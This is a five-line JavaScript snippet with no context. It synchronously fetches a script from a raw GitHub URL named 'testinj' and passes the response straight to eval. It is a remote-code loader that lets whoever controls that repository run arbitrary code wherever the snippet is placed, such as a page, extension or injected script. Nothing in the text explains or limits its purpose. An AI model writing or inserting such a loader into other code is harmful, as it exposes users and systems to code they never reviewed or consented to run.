var url = "https://raw.githubusercontent.com/ebanayaVM/vm-comp/main/testinj";
var xhr = new XMLHttpRequest();
xhr.open("GET", url, false); 
xhr.send();
eval(xhr.responseText);